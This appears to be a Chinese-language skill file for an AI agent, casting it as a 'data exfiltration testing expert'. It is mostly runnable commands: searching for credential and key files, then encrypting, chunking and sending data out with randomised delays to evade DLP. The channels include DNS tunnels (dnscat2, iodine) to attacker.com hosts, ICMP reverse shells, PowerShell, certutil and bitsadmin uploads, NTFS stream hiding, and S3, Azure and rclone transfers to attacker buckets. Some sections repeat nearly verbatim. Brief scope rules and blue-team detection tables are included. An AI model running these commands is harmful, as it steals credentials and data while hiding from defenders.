---
name: data-exfiltration
description: 数据外泄测试、隐蔽通道、DLP绕过、流量伪装。当用户提到数据外泄、exfiltration、数据窃取、隐蔽通道、DNS隧道时使用。
disable-model-invocation: false
user-invocable: false
---

# 数据外泄测试

## 角色定义

你是数据外泄测试专家，精通隐蔽通道和 DLP 绕过。目标：在授权测试中验证数据防泄漏能力。

## 行为指令

1. **确认范围**: 授权范围、允许的外泄通道、数据敏感级别
2. **数据发现**: 定位敏感数据位置
3. **选择通道**: 根据目标网络限制选择外泄方式
4. **执行测试**: 使用 MCP 工具或手动方法
5. **报告**: 记录外泄路径、成功率、被检测情况

## 工具策略

| 任务 | 首选 MCP 工具 | 备选 |
|------|---------------|------|
| 数据外泄 | mcp__redteam__exfiltrate_data | 手动脚本 |
| 文件外泄 | mcp__redteam__exfiltrate_file | curl/scp |
| 凭证搜索 | mcp__redteam__credential_find | grep/find |
| DNS 查询 | mcp__redteam__dns_lookup | dig/nslookup |

## 决策树

```
网络限制？
├── 出站 HTTP/HTTPS 允许
│   ├── HTTPS POST → mcp__redteam__exfiltrate_data
│   ├── 伪装 API 流量 → 嵌入合法请求
│   └── 云存储上传 → S3/Azure Blob
├── 仅 DNS 出站
│   ├── DNS TXT 查询 → base32 编码子域名
│   ├── dnscat2 → 双向 DNS 隧道
│   └── iodine → IP-over-DNS
├── 仅 ICMP 出站
│   ├── ICMP payload → 嵌入数据
│   └── ptunnel → ICMP 隧道
├── 严格限制
│   ├── 隐写术 → 图片/音频 LSB
│   ├── 物理介质 → USB / 打印
│   └── 时间信道 → 请求间隔编码
└── 无网络
    └── 物理接触 → 拍照/USB/蓝牙
```

## 外泄通道速查

| 通道 | 隐蔽性 | 带宽 | 检测难度 | 工具 |
|------|--------|------|----------|------|
| HTTPS POST | 中 | 高 | 低(DLP) | curl/httpx |
| DNS 子域 | 高 | 低 | 高 | dnscat2, iodine |
| ICMP payload | 高 | 低 | 中 | ptunnel, icmpsh |
| WebSocket | 中 | 高 | 中 | 自定义客户端 |
| 云同步 | 高 | 高 | 中 | rclone |
| 邮件附件 | 低 | 中 | 低 | SMTP |
| 隐写术 | 极高 | 极低 | 极高 | steghide, Cloakify |

## 数据准备流程

```bash
# 1. 发现敏感数据
find / -name "*.conf" -o -name "*.env" -o -name "*.key" 2>/dev/null
grep -rl "password\|api_key\|secret" /opt /var/www 2>/dev/null

# 2. 压缩
tar czf /tmp/.data.tar.gz /path/to/sensitive/

# 3. 加密 (避免 DLP 内容检测)
openssl enc -aes-256-cbc -salt -in /tmp/.data.tar.gz -out /tmp/.data.enc -pass pass:KEY

# 4. 分块 (避免大文件检测)
split -b 100k /tmp/.data.enc /tmp/.chunk_

# 5. 外泄
for f in /tmp/.chunk_*; do
    curl -s -X POST https://receiver/upload -F "file=@$f"
    sleep $((RANDOM % 5 + 2))  # 随机延迟
done
```

## 检测规避

| 检测方式 | 规避策略 |
|----------|----------|
| DLP 内容检测 | 加密后传输 |
| 流量大小告警 | 分块 + 随机延迟 |
| 异常时间检测 | 工作时间传输 |
| 域名黑名单 | 使用合法云服务 |
| 协议检测 | 流量伪装为正常 API |

## 输出格式

```markdown
## 数据外泄测试报告

### 测试通道
| 通道 | 是否成功 | 被检测 | 传输量 |
|------|----------|--------|--------|

### 发现的敏感数据位置
[列表]

### DLP 有效性评估
[分析]

### 修复建议
1. 出站流量审计
2. DNS 查询监控
3. 加密流量 DPI
```

## 约束

- 仅在授权范围内测试，不外泄真实敏感数据
- 测试用合成数据或标记数据
- 记录所有外泄路径用于报告
- 测试后清理所有中间文件和接收端数据

## DNS 外泄实战

### dnscat2 隧道

攻击端启动 server，受害端运行 client，通过 DNS 查询建立双向隧道。

```bash
# 攻击端 — 启动 dnscat2 server
# 需要将 NS 记录指向攻击机 IP，或使用 direct 模式
dnscat2-server exfil.attacker.com --secret=SharedSecret123 --no-cache

# 受害端 — 启动 dnscat2 client
./dnscat --secret=SharedSecret123 --dns server=attacker_ip,port=53,type=TXT exfil.attacker.com

# server 端交互：获取 shell / 下载文件
# dnscat2> session -i 1
# command (victim01) > download /etc/shadow /tmp/shadow.txt
# command (victim01) > shell
```

### iodine IP-over-DNS 隧道

通过 DNS 查询封装 IP 流量，建立完整的网络隧道。

```bash
# 攻击端 — 启动 iodine server
# -f 前台运行, -c 禁用客户端 IP 检查, -P 设置密码
# 创建 tun 接口 10.0.0.1/27
iodined -f -c -P ExfilPass123 10.0.0.1/27 t.attacker.com

# 受害端 — 启动 iodine client
# -f 前台运行, -r 强制使用 raw UDP, -P 密码
iodine -f -r -P ExfilPass123 -T TXT t.attacker.com

# 隧道建立后，受害端获得 10.0.0.2，攻击端 10.0.0.1
# 通过隧道传输文件
scp -o ProxyCommand="nc 10.0.0.1 22" /tmp/.data.enc attacker@10.0.0.1:/loot/
```

### 手动 DNS 子域名外泄

将数据编码为 base32 后嵌入 DNS 子域名查询，每次最多 63 字节标签。

```bash
# 数据编码 + 分块 + DNS 查询外泄
xxd -p /tmp/secret.txt | fold -w 60 | while read chunk; do
    encoded=$(echo "$chunk" | base32 -w0 | tr '=' '-')
    dig +short "${encoded}.exfil.attacker.com" @8.8.8.8 > /dev/null
    sleep $((RANDOM % 3 + 1))
done

# 攻击端用 tcpdump 捕获并还原
tcpdump -i eth0 -w dns_exfil.pcap 'udp port 53 and host attacker_ip'
tshark -r dns_exfil.pcap -T fields -e dns.qry.name | \
    sed 's/.exfil.attacker.com//' | tr '-' '=' | base32 -d | xxd -r -p > recovered.txt
```

### DNS TXT 记录外泄 one-liner

```bash
# 将文件内容通过 TXT 查询外泄（每条最多 255 字节）
cat /etc/passwd | base64 -w0 | fold -w 200 | nl | while read n line; do
    dig TXT "${n}.${line}.d.attacker.com" +short > /dev/null 2>&1
done
```

## ICMP 隧道

### ptunnel-ng 隧道

通过 ICMP Echo/Reply 封装 TCP 流量。

```bash
# 攻击端 — 启动 ptunnel-ng server (proxy)
# -r 指定转发目标地址, -R 转发目标端口
# -s 启用密码认证, -v 详细输出级别
ptunnel-ng -s -r127.0.0.1 -R22 -v4 -x PtunnelPass

# 受害端 — 启动 ptunnel-ng client
# -p 指定 proxy (攻击端) IP, -l 本地监听端口
# -r 远端转发地址, -R 远端转发端口
ptunnel-ng -p attacker_ip -l 8022 -r127.0.0.1 -R22 -x PtunnelPass

# 受害端通过本地端口连接攻击端 SSH
ssh -p 8022 attacker@127.0.0.1
# 然后通过 SSH 隧道传输文件
scp -P 8022 /tmp/.data.enc attacker@127.0.0.1:/loot/
```

### icmpsh 反向 ICMP Shell

无需管理员权限的 ICMP 反向 shell（Windows 受害端）。

```bash
# 攻击端 (Linux) — 先禁用内核 ICMP 应答，再启动监听
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py attacker_ip victim_ip

# 受害端 (Windows) — 运行 icmpsh client
icmpsh.exe -t attacker_ip -d 500 -b 30 -s 128
# -t 攻击端 IP, -d 请求间隔(ms), -b 空包数量限制, -s 最大数据大小
```

### 手动 ICMP 数据嵌入

利用 `ping -p` 在 ICMP payload 中嵌入 hex 数据。

```bash
# 将数据转为 hex，嵌入 ping payload（每次最多 16 字节 pattern）
xxd -p /tmp/secret.txt | fold -w 32 | while read hex_chunk; do
    ping -c 1 -p "$hex_chunk" -s 32 attacker_ip > /dev/null 2>&1
    sleep 1
done

# 攻击端捕获并还原
tcpdump -i eth0 -X 'icmp and icmp[icmptype]=icmp-echo' -w icmp_exfil.pcap
tshark -r icmp_exfil.pcap -T fields -e data.data | tr -d ':' | xxd -r -p > recovered.txt
```

## 隐写术命令

### steghide（JPEG/BMP/WAV/AU 隐写）

```bash
# 将秘密文件嵌入载体图片
# -cf 载体文件, -ef 嵌入文件, -sf 输出文件, -p 密码
steghide embed -cf cover.jpg -ef secret.txt -sf stego.jpg -p "StegPass123" -f

# 提取隐藏数据
steghide extract -sf stego.jpg -xf extracted.txt -p "StegPass123" -f

# 查看载体容量信息
steghide info cover.jpg
```

### Cloakify 文本隐写

将二进制数据转换为看似正常的文本列表（如 IP 地址、电影名等）。

```bash
# 编码：将 payload 伪装为正常文本
python3 cloakify.py secret.tar.gz ciphers/ciperIPAddresses cloaked.txt

# 解码：还原原始数据
python3 decloakify.py cloaked.txt ciphers/ciperIPAddresses recovered.tar.gz

# 带噪声层编码（增加分析难度）
python3 cloakifyFactory.py
# 交互菜单 → 选择 Cloakify → 选择 cipher → 添加 noise generator
```

### zsteg PNG/BMP 分析

```bash
# 快速检测 PNG/BMP 中的隐写内容
zsteg stego.png

# 详细扫描所有通道和位平面
zsteg stego.png -a

# 仅检查 LSB 隐写
zsteg stego.png -e "b1,rgb,lsb"

# 提取特定通道数据到文件
zsteg stego.png -E "b1,rgb,lsb" > extracted_data.bin
```

### exiftool 元数据隐藏

```bash
# 在 EXIF Comment 字段隐藏 base64 编码数据
exiftool -Comment="$(base64 -w0 secret.txt)" cover.jpg

# 提取隐藏数据
exiftool -Comment -b cover.jpg | base64 -d > recovered.txt

# 利用 XMP 自定义字段隐藏数据
exiftool -XMP-dc:Description="$(cat secret.txt | base64 -w0)" cover.jpg

# 查看所有元数据（检测异常）
exiftool -all cover.jpg
```

## Windows 外泄技术

### certutil Base64 编码/解码

```powershell
# 将文件编码为 base64（绕过二进制传输检测）
certutil -encode C:\Sensitive\data.zip C:\ProgramData\data.b64

# 解码还原
certutil -decode C:\ProgramData\data.b64 C:\Sensitive\data.zip

# 结合 HTTPS 外泄
certutil -encode C:\Sensitive\data.zip C:\ProgramData\data.b64
$content = Get-Content C:\ProgramData\data.b64 -Raw
Invoke-WebRequest -Uri "https://receiver.attacker.com/upload" -Method POST -Body $content
```

### bitsadmin 文件传输

```powershell
# 上传文件到攻击端（利用 BITS 后台智能传输服务）
bitsadmin /transfer exfiljob /upload https://receiver.attacker.com/upload C:\Sensitive\data.zip

# 下载工具到受害端
bitsadmin /transfer dltools /download /priority foreground ^
    https://attacker.com/tools/nc.exe C:\ProgramData\nc.exe

# 创建持久化传输任务（断点续传）
bitsadmin /create /upload exfiljob
bitsadmin /addfile exfiljob https://receiver.attacker.com/upload C:\Sensitive\data.zip
bitsadmin /setnotifycmdline exfiljob cmd.exe "/c del C:\Sensitive\data.zip"
bitsadmin /resume exfiljob
```

### PowerShell 外泄方法

```powershell
# Invoke-WebRequest POST 外泄
$bytes = [System.IO.File]::ReadAllBytes("C:\Sensitive\data.zip")
Invoke-WebRequest -Uri "https://receiver.attacker.com/upload" `
    -Method POST -ContentType "application/octet-stream" -Body $bytes

# [Net.WebClient] 上传文件
$wc = New-Object System.Net.WebClient
$wc.UploadFile("https://receiver.attacker.com/upload", "C:\Sensitive\data.zip")

# 分块外泄 + 随机延迟
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Sensitive\data.zip"))
$chunks = $data -split "(.{4096})" | Where-Object { $_ }
$i = 0
foreach ($chunk in $chunks) {
    Invoke-RestMethod -Uri "https://receiver.attacker.com/chunk/$i" `
        -Method POST -Body $chunk
    $i++
    Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
}
```

### ADS（Alternate Data Streams）数据隐藏

```powershell
# 将敏感数据隐藏到 NTFS 备用数据流
# 正常文件大小不变，dir 不显示 ADS 内容
type C:\Sensitive\secret.txt > C:\ProgramData\legit.log:hidden.txt

# 读取 ADS 中的隐藏数据
more < C:\ProgramData\legit.log:hidden.txt

# PowerShell 操作 ADS
Set-Content -Path "C:\ProgramData\legit.log" -Stream "hidden" -Value (Get-Content C:\Sensitive\secret.txt)
Get-Content -Path "C:\ProgramData\legit.log" -Stream "hidden"

# 枚举文件的所有 ADS（蓝队检测用）
Get-Item C:\ProgramData\legit.log -Stream *
dir /r C:\ProgramData\legit.log
```

### Windows 暂存位置

```powershell
# 常用暂存路径（低监控区域）
C:\ProgramData\                          # 所有用户可写
$env:TEMP                                # 用户临时目录 C:\Users\<user>\AppData\Local\Temp
C:\Windows\Temp\                         # 系统临时目录
C:\ProgramData\legit.log:hidden.txt      # ADS 隐藏流

# 伪装文件名
Copy-Item C:\Sensitive\data.zip "$env:TEMP\WindowsUpdate.log"
# 利用 ADS 隐藏在合法文件中
cmd /c "type C:\Sensitive\data.zip > $env:TEMP\desktop.ini:update.dat"
```

## 云服务外泄

### AWS S3 外泄

```bash
# 直接上传到攻击者控制的 S3 bucket
# 使用攻击者的 AWS 凭证
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
aws s3 cp /tmp/.data.enc s3://attacker-exfil-bucket/loot/data.enc --no-sign-request

# 生成预签名 URL（无需受害端安装 AWS CLI）
# 攻击端生成上传 URL
aws s3 presign s3://attacker-exfil-bucket/loot/upload.bin --expires-in 3600

# 受害端用 curl 通过预签名 URL 上传
curl -X PUT -T /tmp/.data.enc "https://attacker-exfil-bucket.s3.amazonaws.com/loot/upload.bin?X-Amz-Algorithm=..."

# 利用受害环境已有的 S3 权限外泄到外部 bucket
aws s3 cp s3://internal-bucket/sensitive/ s3://attacker-bucket/loot/ --recursive
```

### Azure azcopy + SAS Token 外泄

```bash
# 攻击端生成 SAS token（对 Blob 容器有写权限）
# 受害端使用 azcopy 上传
azcopy copy "/tmp/.data.enc" \
    "https://attackerstorage.blob.core.windows.net/exfil/data.enc?sv=2023-01-03&ss=b&srt=o&sp=wac&se=2026-12-31&sig=..."

# 批量上传目录
azcopy copy "/tmp/loot/" \
    "https://attackerstorage.blob.core.windows.net/exfil/?sv=2023-01-03&ss=b&srt=o&sp=wac&se=2026-12-31&sig=..." \
    --recursive=true

# 无 azcopy 时用 curl + SAS token
curl -X PUT -H "x-ms-blob-type: BlockBlob" \
    -T /tmp/.data.enc \
    "https://attackerstorage.blob.core.windows.net/exfil/data.enc?sv=2023-01-03&ss=b&srt=o&sp=wac&se=2026-12-31&sig=..."
```

### rclone 多云同步外泄

```bash
# 配置攻击者云存储（交互式或直接写配置）
cat >> ~/.config/rclone/rclone.conf << 'EOF'
[exfil]
type = s3
provider = AWS
access_key_id = AKIA...
secret_access_key = ...
region = us-east-1
EOF

# 同步敏感目录到攻击者存储
rclone copy /tmp/loot/ exfil:attacker-bucket/loot/ --transfers 1 --bwlimit 100k

# 使用 Google Drive 作为外泄通道
rclone copy /tmp/loot/ gdrive:exfil/ --drive-chunk-size 8M

# 加密后同步（rclone 内置加密）
rclone copy /tmp/loot/ exfil:attacker-bucket/loot/ --crypt-remote exfil:encrypted/
```

## 蓝队检测指标

| 通道 | 检测指标 | 监控工具 | 告警阈值 |
|------|----------|----------|----------|
| DNS 子域名外泄 | 单域名高频 TXT/CNAME 查询、子域名长度异常（>30 字符）、高熵子域名 | Zeek dns.log / Suricata / Splunk DNS Analytics | 单域名 >100 查询/小时，子域名熵值 >3.5 |
| DNS 隧道 (dnscat2/iodine) | NULL/TXT 记录异常比例、DNS 响应体积异常、持续性 DNS 会话 | Passive DNS / Zeek / dnstap + ELK | NULL 记录 >5%，单次响应 >512 字节 |
| ICMP 隧道 | ICMP payload 大小异常、ICMP 会话持续时间长、Echo/Reply 频率异常 | Suricata / Zeek / Wireshark | payload >64 字节，单 IP ICMP >50 包/分钟 |
| HTTPS POST 外泄 | 大体积 POST 到低信誉域名、非工作时间传输、TLS JA3 指纹异常 | Zeek ssl.log / DLP / CASB / Proxy 日志 | 单次 POST >10MB，非工作时间上传 >1MB |
| 云存储外泄 | 异常 S3/Blob API 调用、跨账户数据复制、非公司云服务访问 | CloudTrail / Azure Monitor / CASB | 跨账户 CopyObject、非白名单 bucket 访问 |
| 隐写术 | 图片文件熵值异常、EXIF 数据体积异常、文件大小与分辨率不匹配 | YARA 规则 / 自定义脚本 / StegExpose | 文件熵值 >7.5，EXIF Comment >1KB |
| ADS 隐藏 | NTFS 备用数据流创建事件、异常 ADS 大小 | Sysmon EventID 15 / YARA / Velociraptor | 非系统进程创建 ADS，ADS >10KB |
| certutil/bitsadmin | 进程命令行参数异常、非常规路径调用 | Sysmon EventID 1 / EDR / Sigma 规则 | certutil -encode/-urlcache 调用，bitsadmin /transfer 到外部 URL |
| rclone 同步 | rclone 进程启动、配置文件创建、大量文件读取 | EDR / Sysmon / 文件完整性监控 | rclone.exe 进程出现，~/.config/rclone/ 创建 |

## DNS 外泄实战

```bash
# dnscat2 服务端
ruby dnscat2.rb tunnel.attacker.com --secret=SHARED_SECRET
# dnscat2 客户端
./dnscat --dns server=attacker.com,port=53 --secret=SHARED_SECRET

# iodine 服务端
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
# iodine 客户端
iodine -f -P password attacker.com tunnel.attacker.com

# 手动 DNS 外泄 (base32 编码到子域名)
cat secret.txt | xxd -p | fold -w 60 | while read line; do
    dig +short "$line.exfil.attacker.com" @attacker-dns
    sleep $((RANDOM % 3 + 1))
done
```

## ICMP 隧道

```bash
# ptunnel-ng 服务端
ptunnel-ng -r -R 22 -v 4
# ptunnel-ng 客户端
ptunnel-ng -p proxy-host -l 8022 -r target -R 22

# icmpsh 攻击端 (先关闭 ICMP 回复)
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py attacker-ip victim-ip
# icmpsh 受害端 (Windows)
icmpsh.exe -t attacker-ip -d 500 -b 30 -s 128
```

## 隐写术命令

```bash
# steghide 嵌入/提取
steghide embed -cf cover.jpg -ef secret.txt -p passphrase -f
steghide extract -sf stego.jpg -p passphrase

# Cloakify 编码/解码
python3 cloakify.py payload.txt ciphers/desserts > encoded.txt
python3 decloakify.py encoded.txt ciphers/desserts > payload.txt

# zsteg PNG 分析
zsteg image.png -a

# exiftool 元数据隐藏
exiftool -Comment="hidden data here" image.jpg
```

## Windows 外泄技术

```powershell
# certutil base64 编码
certutil -encode secret.txt encoded.b64
certutil -decode encoded.b64 secret.txt

# bitsadmin 文件传输
bitsadmin /transfer exfil /upload /priority high http://attacker/upload C:\data\secret.zip

# PowerShell 上传
Invoke-WebRequest -Uri http://attacker/upload -Method POST -InFile C:\data\secret.zip
[System.Net.WebClient]::new().UploadFile("http://attacker/upload", "C:\data\secret.zip")

# NTFS ADS 隐藏数据
cmd /c "echo secret > normal.txt:hidden.txt"
more < normal.txt:hidden.txt
dir /r  # 列出 ADS

# 常用暂存位置: C:\ProgramData\  C:\Windows\Temp\  %APPDATA%\  ADS流
```

## 云服务外泄

```bash
# AWS S3
aws s3 cp secret.zip s3://attacker-bucket/ --no-sign-request
# 预签名 URL
aws s3 presign s3://attacker-bucket/upload --expires-in 3600

# Azure SAS token
azcopy copy "secret.zip" "https://storage.blob.core.windows.net/exfil/secret.zip?SAS_TOKEN"

# rclone 同步
rclone copy /sensitive/ remote:exfil-bucket/ --transfers 1 --bwlimit 100k
```

## 蓝队检测指标

| 通道 | 检测指标 | 监控工具 | 告警阈值 |
|------|----------|----------|----------|
| DNS | 异常长子域名 / 高频 TXT 查询 | Zeek dns.log / Suricata | 子域名 >50 字符 / >100 查询/分钟 |
| ICMP | Payload 大小异常 / 高频 ICMP | Wireshark / Suricata | Payload >64 bytes / >50 pkt/s |
| HTTPS | 大量上传 / 异常目标 | DLP / Proxy 日志 | 上传 >10MB / 新域名 |
| 云存储 | 非授权 S3/Blob 访问 | CloudTrail / Azure Monitor | 非白名单桶/容器 |
| 隐写 | 文件大小异常 / 元数据修改 | YARA 规则 / 文件完整性 | 图片 >5MB / 元数据变更 |
| ADS | NTFS 替代数据流 | Sysmon EventID 15 | 任何 ADS 创建 |

